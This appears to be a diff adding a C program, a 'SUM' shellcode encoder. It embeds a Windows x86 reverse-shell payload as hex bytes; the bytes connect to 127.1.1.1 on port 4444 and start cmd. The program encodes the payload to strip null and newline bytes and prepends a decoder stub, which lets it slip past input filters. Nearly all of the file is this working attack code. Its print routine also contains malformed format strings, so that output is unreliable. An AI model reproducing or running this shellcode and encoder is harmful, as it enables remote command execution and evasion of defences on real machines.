@@ -1,0 +1,138 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/*
+ jmp short one
+ decoder:
+ pop esi
+ xor ecx , ecx
+ mov cx , 0
+ loop:
+ sub byte [esi + ecx - 1], 0
+ dec cl
+ jnz loop
+ jmp short codedShellcode
+ one:
+ call decoder
+ codedShellcode:
+*/
+
+/*this payload contains x00 || x0a || x0d*/
+char payload[] = "\xeb\x66\x56\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
+"\x70\x1c\xad\x8b\x40\x08\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x7d\x3c\x8b\x7c"
+"\x3d\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x85\xc9\x74\x37\x49\x8b"
+"\x34\x8b\x01\xee\x31\xd2\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xca\x0d\x01"
+"\xc2\xe9\xf1\xff\xff\xff\x3b\x54\x24\x28\x75\xdc\x8b\x57\x24\x01\xea\x66"
+"\x8b\x0c\x4a\x8b\x57\x1c\x01\xea\x8b\x04\x8a\x01\xe8\x89\x44\x24\x1c\x61"
+"\xc3\xeb\x02\xeb\x1d\xe8\xf9\xff\xff\xff\x8e\x4e\x0e\xec\x7e\xd8\xe2\x73"
+"\x72\xfe\xb3\x16\xd9\x09\xf5\xad\xec\xf9\xaa\x60\xcb\xed\xfc\x3b\x5e\x31"
+"\xc0\xb0\x30\x29\xc4\x89\xe5\xe8\x6b\xff\xff\xff\x89\xc3\x31\xc9\xb1\x03"
+"\x89\xea\x85\xc9\x74\x1f\xad\x50\x53\xe8\x6a\xff\xff\xff\x51\xc1\xe1\x02"
+"\x8d\x1c\x0a\x89\x03\x59\x5b\x31\xc0\xb0\x04\x01\xc4\x49\xe9\xdd\xff\xff"
+"\xff\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f"
+"\x54\xff\x55\x0c\x89\xc3\x8d\x55\x0c\x31\xc9\xb1\x03\x85\xc9\x74\x1f\xad"
+"\x50\x53\xe8\x29\xff\xff\xff\x51\xc1\xe1\x02\x8d\x1c\x0a\x89\x03\x59\x5b"
+"\x31\xc0\xb0\x04\x01\xc4\x49\xe9\xdd\xff\xff\xff\xb8\x01\x63\x6d\x64\xc1"
+"\xf8\x08\x50\x89\x65\x2c\x31\xc0\xb4\x02\x29\xc4\x54\xc1\xe8\x08\x50\xff"
+"\x55\x10\x31\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x18\x89\xc6\x68"
+"\x7f\x01\x01\x01\xbb\x02\x01\x11\x5c\xfe\xcf\x53\x89\xe3\x31\xc0\xb0\x10"
+"\x50\x53\x56\xff\x55\x14\x31\xc9\xb1\x54\x29\xcc\x89\xe7\x57\x31\xc0\xf3"
+"\xaa\x5f\xc6\x07\x44\xc6\x47\x2d\x01\x57\x89\xf0\x8d\x7f\x38\xab\xab\xab"
+"\x5f\x31\xc0\x8d\x77\x44\x56\x57\x50\x50\xb0\x08\x50\xb0\x01\x50\x48\x50"
+"\x50\xff\x75\x2c\x50\xff\x55\x04\xff\x55\x08";
+
+/*80 01 0x180 = 384 */
+
+char decoder [] = "\xeb\x12\x5e\x31\xc9\x66\xb9\x00\x00\x80\x6c\x0e\xff\x00\x66\x49"
+                  "\x75\xf7\xeb\x05\xe8\xe9\xff\xff\xff";
+                  
+int r[4];
+ 
+void Hexa(int number)
+{
+    int i=0;    
+    while(number>0)
+    {
+        r[i]=number%16;        
+        number=number/16;
+        i++;        
+    }            
+}
+
+void print_shell(char *data)
+{
+    int i, l = 15;                   
+    for (i = 0; i < strlen (data); ++i)
+    {
+        if(l >= 15)
+        {
+            if(i) printf (" \"\n");
+            printf ("\t\"");
+            l = 0;
+        }
+        ++l;
+        printf ("\\x %02x", (( unsigned char *) data )[i]);
+    }
+    printf (" \";\ n\n\n");
+}
+
+int main(int argc, char *argv[])
+{
+    int i = 0;
+    int token = 1, badchar = 0;
+    int tries = 0;        
+    
+    printf("SUM - Encoder\n");
+    printf("Works with payloads larger than 256 bytes only\n");
+    printf("-----------------------------------------------\n\n"); 
+   
+    int lpayload = sizeof(payload) - 1;    
+       
+    printf("payload length: %d\n", lpayload);
+        
+    Hexa(lpayload);        
+    
+    int LW = r[0] + 16 * r[1];  
+    int HW = r[2] + 16 * r[3];   
+
+    decoder[7] =  LW;
+    decoder[8] =  HW;  
+
+    print_shell(decoder);
+    
+    do
+    {
+        if(badchar == 1)
+        {
+               for(i = 0; i< lpayload; i++) 
+                    payload[i] -= token;    
+               token++;
+               decoder[13] = token;
+               badchar = 0;
+        }
+        for(i = 0; i < lpayload ; i++)
+        {
+               payload[i] += token; 
+               if(payload[i] == 0x00 || payload[i] == 0x0a || payload[i] == 0x0d)
+               {
+                     badchar = 1;                     
+               }            
+        }
+        tries++;
+        printf("try %2d\n", tries);        
+    }while(badchar == 1 && token < 128);
+    
+    int ldecoder = strlen(decoder);    
+
+    char *result = calloc(1, lpayload + ldecoder );    
+  
+    strcpy(result, decoder);
+    memcpy(result + ldecoder, payload, lpayload);
+    
+    print_shell(result);
+
+    free(result);
+    getchar();
+    return 0;
+}
